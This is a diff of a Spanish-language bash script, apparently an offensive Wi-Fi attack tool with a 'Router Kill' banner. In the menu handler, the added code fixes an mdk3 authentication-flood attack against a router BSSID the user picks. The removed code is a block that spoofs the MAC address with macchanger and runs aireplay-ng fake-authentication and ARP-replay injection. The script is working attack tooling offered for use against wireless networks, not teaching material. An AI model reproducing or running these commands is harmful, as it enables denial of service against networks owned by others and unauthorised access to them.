@@ -88,13 +88,12 @@ esac
 
 #Opciones menu
 
-a=$'\033[1;37mDeauth Atack\e[01;32m' 
+a=$'\033[1;37mDeuth Atack\e[01;32m' 
 b=$'\033[1;37mFake Point\e[01;32m'
-c=$'\033[1;37mauth Atttack\e[01;32m'
-new=$'\033[1;37mInject Packets\e[01;32m'
+c=$'\033[1;37mAuth Atttack\e[01;32m'
 d=$'\033[1;37mStop monitor mode\e[01;32m'
 e=$'\033[1;37mCapture Handshake\e[01;32m'
-new2=$'\033[1;37m web Attacks\e[01;32m'
+new2=$'\033[1;37mWeb Attacks\e[01;32m'
 update=$'\033[1;37mUpdate Program\e[01;32m'
 f=$'\033[1;37mexit Program\e[01;32m'
 
@@ -490,7 +489,7 @@ done
 function menu_principal(){
 echo
 echo
-select menu in "$a" "$b" "$c" "$new" "$d" "$e" "$new2" "$update" "$f";
+select menu in "$a" "$b" "$c" "$d" "$e" "$new2" "$update" "$f";
 do
 case $menu in 
 
@@ -812,10 +811,12 @@ menu_principal
 
 $c)
 clear
-sleep 1
+sleep 3
 echo -e "$amarillo[*]$blanco Este ataque creara un flood de intentos de conexion al router..."
 sleep 3
+echo
 echo -e "$amarillo[*]$blanco detectando interfaces disponibles...."
+sleep 3
 mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
 
 if [ "${#interfaces[@]}" -eq 0 ]; then
@@ -865,11 +866,12 @@ pkill dhclient && pkill wpa_supplicant
 clear
 sleep 1
 echo -e "$verde[+]$blanco modo monitor iniciado correctamente"
-sleep 2
-echo -e "[*]$amarillo $blanco escaneando redes disponibles..."
+sleep 3
+echo
+echo -e "$amarillo[*]$blanco escaneando redes disponibles..."
 sleep 2
 echo
-echo -e "[*]$amarillo $blanco espera 20 segundos despues del escaneo.."
+echo -e "$amarillo[*] $blanco espera 20 segundos despues del escaneo.."
 sleep 10
 timeout --foreground 20s airodump-ng $interface
 
@@ -949,7 +951,7 @@ tmp_bssid_file="/tmp/mdk3_bssid.txt"
 echo "$bssid" > "$tmp_bssid_file"
 
 sleep 2
-echo -e "$nc($azul*$nc)$verde El ataque comenzara en 5 segundos.."
+echo -e "$amarillo[*]$blanco el ataque comenzara en 5 segundos"
 sleep 1
 echo "4 segundos"
 sleep 1
@@ -959,86 +961,30 @@ echo "2 segundos"
 sleep 1
 echo "1 segundos"
 sleep 1
-echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
+echo -e "$verde[+]$blanco ataque iniciado.. tiempo restante$amarillo $sec $blanco segundos"
 sleep 2
-timeout --foreground $sec$s mdk3 $interface a -a $doc
-echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
-sleep 2
-echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
-sleep 2
+timeout --foreground $sec$s mdk3 $interface a -a $bssid
+echo -e "$verde[+]$blanco ataque finalizado..."
+sleep 4
+echo
+echo -e "$amarillo[*]$blanco Deteniendo modo monitor...."
+sleep 4
 airmon-ng stop $interface
+clear
+echo -e "$verde[*]$blanco volviendo al menu principal en 5 segundos..."
+sleep 5
+clear 
+toilet --filter border Router Kill | lolcat
+echo
+sleep 2
+echo
 menu_principal
 
 
 
 ;;
 
-$new)
 
-echo -e "$nc($azul*$nc)$verde Este Ataque realizara un flood de intentos de conexion al router"
-sleep 2
-echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
-sleep 2
-echo
-echo
-ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
-sleep 1
-echo
-printf "\e[01;35m su interfaz:\e[01;32m "
-read interface
-echo -e "$nc($azul*$nc)$verde Modificaremos su direccion MAC"
-ifconfig $interface down
-macchanger -r $interface
-val=$(ifconfig $interface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
-echo -e "$nc($azul*$nc)$verde Direccion MAC falsificada"
-sleep 2
-echo -e "$nc($azul*$nc)$verde Iniciando modo monitor.."
-sleep 3
-airmon-ng start $interface
-pkill dhclient && pkill wpa_supplicant
-echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
-sleep 2
-echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
-sleep 2
-echo -e "$nc($azul*$nc)$rojo AVISO: Espera 20 segundos$verde cuando inicie el analisis"
-sleep 9
-timeout --foreground 20s airodump-ng $interface$mon
-echo
-printf "\e[01;35m Añade el BSSID de la red:\e[01;32m "
-read bssid
-echo
-printf "\e[01;35m Añade el canal de la red (CH):\e[01;32m "
-read ch
-printf "\e[01;35m Añade duracion del ataque en segundos:\e[01;32m "
-read sec
-
-sleep 2
-echo -e "$nc($azul*$nc)$verde El ataque comenzara en 5 segundos..."
-sleep 1
-echo "4 segundos"
-sleep 1
-echo "3 segundos"
-sleep 1
-echo "2 segundos"
-sleep 1
-echo "1 segundos"
-sleep 1
-echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
-sleep 2
-timeout --foreground $sec$s xterm -hold -e "airodump-ng --bssid $bssid -c $ch  $interface$mon" & 
-sleep 1
-timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --fakeauth 2 -a $bssid -c $val $interface$mon" &
-sleep 1
-timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --arpreplay -b $bssid -h $val $interface$mon"
-echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
-sleep 2
-echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$amarillo"
-sleep 2
-airmon-ng stop $interface$mon
-menu_principal
-
-
-;;
 
 $d)
 
